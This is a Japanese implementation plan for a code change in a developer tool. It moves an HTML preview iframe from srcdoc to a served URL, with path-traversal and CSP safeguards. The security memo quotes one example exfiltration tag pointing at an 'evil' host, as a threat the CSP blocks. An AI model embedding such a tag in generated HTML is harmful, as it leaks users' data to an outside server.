# Files ビュー HTML プレビューの相対パス解決 — 実装プラン

## 背景 / バグ

LLM に「workspace 上の画像を含む HTML を作って」と頼むと、`artifacts/html/<name>.html` の中で `<img src="../images/2026/04/<id>.png">` のように **相対パス**で画像を参照する。これは正しい書き方で、ファイルをブラウザで直接開けば表示される。しかし MulmoClaude の **Files ビュー**で同じファイルを開くと画像が出ない。

原因: `src/components/FileContentRenderer.vue:70-76` の HTML プレビュー iframe が `srcdoc` で読み込まれており、`srcdoc` ドキュメントは `about:srcdoc` をベース URL として持つ。`<img src="../images/...">` が `about:srcdoc/../...` に解決されて 404 になる。加えて `sandbox="allow-scripts"`(`allow-same-origin` なし)で iframe は **opaque origin** なので、CSP の `'self'` も同 origin のサーバ URL にマッチしない。

PR #969 で `/artifacts/images/` の path-based static mount は導入済み。このプランは **HTML プレビュー側を `srcdoc` から `src=` に切り替えてブラウザにベース URL を持たせ、相対パスを自然に解決させる** Option B。

## ゴール

1. `artifacts/html/` 配下の HTML を Files ビューで開いたとき、HTML 内の `<img src="../images/...">` が **何も書き換えずに**表示される
2. CSP / sandbox による既存のセキュリティ境界を維持(`allow-scripts` のみ、`allow-same-origin` は付けない)
3. **Files ビュー以外への影響を最小限に抑える**(presentHtml プラグイン、wiki、markdown プレビュー等は触らない)

## 全体構成

| レイヤー | 仕事 |
|---|---|
| `server/index.ts` | `/artifacts/html` を path-based static mount として追加(PR #969 の `/artifacts/images` の対) |
| CSP | `<meta>` 注入(srcdoc 用)に加えて、新 mount は HTTP `Content-Security-Policy` ヘッダで配る。`'self'` がサーバ origin として効くようになる |
| `useContentDisplay.ts` | `selectedPath` が `artifacts/html/` 配下の HTML なら `/artifacts/html/<rest>` URL を返す `htmlPreviewUrl` を派生させる。それ以外は `null` |
| `FileContentRenderer.vue` | `htmlPreviewUrl` があれば iframe を `src=` でロード。なければ既存 `srcdoc` フォールバック |

## Stage 1: サーバ static mount 追加

### `server/index.ts`

`/artifacts/images` の直後に並べる(同パターン):

```ts
const HTML_EXT_RE = /\.html?$/i;
let htmlsDirReal: string | null = null;
async function getHtmlsDirReal(): Promise<string | null> {
  if (htmlsDirReal) return htmlsDirReal;
  try {
    htmlsDirReal = await fsRealpath(WORKSPACE_PATHS.htmls);
    return htmlsDirReal;
  } catch {
    return null;
  }
}
app.use(
  "/artifacts/html",
  async (req, res, next) => {
    if (!HTML_EXT_RE.test(req.path)) { res.status(404).end(); return; }
    const root = await getHtmlsDirReal();
    if (!root) { res.status(404).end(); return; }
    let relPath: string;
    try { relPath = decodeURIComponent(req.path.replace(/^\//, "")); }
    catch { res.status(404).end(); return; }
    if (!resolveWithinRoot(root, relPath)) { res.status(404).end(); return; }
    res.setHeader("Content-Security-Policy", buildHtmlPreviewCsp());
    res.setHeader("X-Content-Type-Options", "nosniff");
    next();
  },
  express.static(WORKSPACE_PATHS.htmls, { dotfiles: "deny", fallthrough: false }),
);
```

### 三段ガード(PR #969 と同じ理由で必要)

1. **拡張子 allowlist**: `.html` / `.htm` 以外は 404。LLM 出力以外を誤配信させない。
2. **`resolveWithinRoot` symlink チェック**: シンボリックリンクで mount root の外を狙われたら 404。
3. **`dotfiles: 'deny'` + `fallthrough: false`** + `express.static` 内蔵の `..` normalize: パストラバーサル阻止。

bearer auth は `/artifacts/images` と同じ理由で **免除**(iframe `src` は Authorization ヘッダを送れない)。`requireSameOrigin` は引き続き適用される。

### CSP は HTTP ヘッダで配る理由

`srcdoc` 時代は `<meta>` 注入で済んでいた(`wrapHtmlWithPreviewCsp`)。`src=` に切り替わると iframe ドキュメント URL がサーバ origin になる(opaque origin は維持されるが、CSP `'self'` は **URL の origin** で評価されるため同 origin リクエストにマッチする)。HTTP ヘッダで返せばファイル本体に手を入れずに済むし、複数 CSP は intersect で結合されるのでファイル内に既存 `<meta>` があっても安全側に倒れる。

ポリシーは既存 `buildHtmlPreviewCsp()` をそのまま流用。`img-src 'self' ...` の `'self'` がついに意味を持つので、`/artifacts/images/...` への `<img>` リクエストは通る。

## Stage 2: クライアント側で `src=` 切替

### `src/composables/useContentDisplay.ts`

```ts
const HTML_PREVIEW_DIR_PREFIX = "artifacts/html/";

export function htmlPreviewUrlFor(filePath: string | null): string | null {
  if (!filePath) return null;
  const lower = filePath.toLowerCase();
  if (!lower.endsWith(".html") && !lower.endsWith(".htm")) return null;
  if (!filePath.startsWith(HTML_PREVIEW_DIR_PREFIX)) return null;
  const rest = filePath.slice(HTML_PREVIEW_DIR_PREFIX.length);
  return `/artifacts/html/${rest.split("/").map(encodeURIComponent).join("/")}`;
}

const htmlPreviewUrl = computed<string | null>(() =>
  isHtml.value ? htmlPreviewUrlFor(selectedPath.value) : null
);
```

`htmlPreviewUrl` を返り値に追加。`sandboxedHtml` は `htmlPreviewUrl` が無い時のフォールバック用にそのまま残す。

### `src/components/FilesView.vue`

`useContentDisplay` の destructure に `htmlPreviewUrl` を追加し、`FileContentRenderer` に prop として渡す。

### `src/components/FileContentRenderer.vue`

iframe を 2 ブランチに分割:

```vue
<iframe
  v-else-if="isHtml && htmlPreviewUrl"
  :src="htmlPreviewUrl"
  class="w-full h-full border-0"
  sandbox="allow-scripts"
  :title="t('fileContentRenderer.htmlPreview')"
/>
<iframe
  v-else-if="isHtml"
  :srcdoc="sandboxedHtml"
  class="w-full h-full border-0"
  sandbox="allow-scripts"
  :title="t('fileContentRenderer.htmlPreview')"
/>
```

`artifacts/html/` 外の HTML は依然 `srcdoc` で動くので、scope 外への影響なし。

## 受け入れ条件

- [ ] `artifacts/html/<name>.html` を Files ビューで開く → HTML 内の `<img src="../images/...">` が表示される
- [ ] devtools の Network で iframe が `/artifacts/html/<name>.html` に GET し、画像が `/artifacts/images/...` に GET している(両方 200、CSP violation なし)
- [ ] iframe は `sandbox="allow-scripts"` のままで、JS は動くが parent.window へはアクセス不可(既存挙動維持)
- [ ] `artifacts/html/` 外の HTML(あれば)は引き続き `srcdoc` で表示される
- [ ] `/api/files/raw?path=...` への影響なし(他の用途で使われ続ける)
- [ ] `presentHtml` プラグイン、wiki、markdown プレビューは無変更
- [ ] `yarn format` / `yarn lint` / `yarn typecheck` / `yarn build` 全部緑
- [ ] 既存の e2e / unit テストが通る、`useContentDisplay` の新挙動に対する unit テストを追加

## Out of scope

- `artifacts/html-scratch/`(scratch buffer、Files ビューで開く用途は薄い)— 必要になったら同パターンで追加
- `data/wiki/` / `artifacts/documents/` 等に置かれた HTML(typically markdown, ほぼ存在しない)
- `<base>` タグ注入や HTML 文字列の URL 書き換え路線(却下、`src=` 切替の方が綺麗)
- HTML 内から相対参照される **画像以外**(.css / .js など)— LLM はインライン化するのが普通なので必要になってから

## セキュリティ memo

- iframe は **opaque origin のまま**(`allow-same-origin` を付けない)。同 origin URL からロードしても、sandbox によりドキュメントは unique origin 扱い → parent の `localStorage` / Cookie / DOM へはアクセス不可
- CSP `connect-src 'none'` は維持 → phone-home 防止は変わらず
- `img-src 'self'` で `/artifacts/images/...` が通る。LLM が `<img src="https://evil/?leak=...">` を仕込んでも `'self'` + 限定 CDN にマッチしないので exfiltration されない(PR #969 の脅威モデルと同じ)
